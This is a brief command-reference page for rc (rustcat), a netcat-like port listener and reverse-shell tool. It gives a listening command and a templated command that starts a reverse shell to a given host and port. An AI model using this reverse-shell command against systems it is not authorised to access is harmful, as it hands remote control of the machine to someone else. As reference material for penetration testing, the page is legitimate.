<h1>rc</h1>

<blockquote><p>A modern simplistic port listener &amp; reverse shell.
Similar to <code>nc</code>.
More information: <a href="https://github.com/robiot/rustcat/wiki/Basic-Usage">https://github.com/robiot/rustcat/wiki/Basic-Usage</a>.</p></blockquote>

<ul>
<li>Start listening on a specific port:</li>
</ul>


<p><code>rc -lp {{port}}</code></p>

<ul>
<li>Start a reverse shell:</li>
</ul>


<p><code>rc {{host}} {{port}} -r {{shell}}</code></p>
